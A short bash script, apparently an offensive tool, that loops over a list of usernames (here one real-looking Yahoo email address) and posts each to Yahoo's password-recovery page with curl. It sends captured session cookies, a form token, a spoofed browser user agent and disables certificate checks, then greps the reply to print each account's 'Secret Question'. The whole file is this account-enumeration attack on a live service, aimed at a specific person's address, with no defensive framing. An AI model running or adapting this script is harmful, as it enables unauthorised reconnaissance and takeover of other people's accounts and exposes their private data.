#!/bin/bash
#username array
USERNAME=(cheetahdragon14@yahoo.com)

for i in "${USERNAME[@]}"
do

   OUTPUT=`curl -i -s -k  -X 'POST' -H 'User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0' -H 'Referer: https://edit.yahoo.com/mforgot' -H 'Content-Type: application/x-www-form-urlencoded' -b 'B=dpsc3ehaibqtm&b=3&s=u5; ywadp10001468467156=2807892355; fpc10001468467156=ZeqKfREC||; fpc10001756605956=ZSzJATQq||' --data-binary $'stage=fe101&login='"$i"'&cc=&done=http%3A%2F%2Fwww.yahoo.com&intl=us&lang=en-US&partner=reg&src=&appsrc=&ostype=&fs=uq4bhkqHafAYb39UO5XNCBlntocFN2hDy4gbQpjkmCnz6iGWaWvFZkIzqhA3yK4c5kft98qO' 'https://edit.yahoo.com/mforgot' | grep "Secret Question" -A 1`

   if [ ! -z "$OUTPUT" ]
   then
     echo $i
     echo $OUTPUT
   fi
done
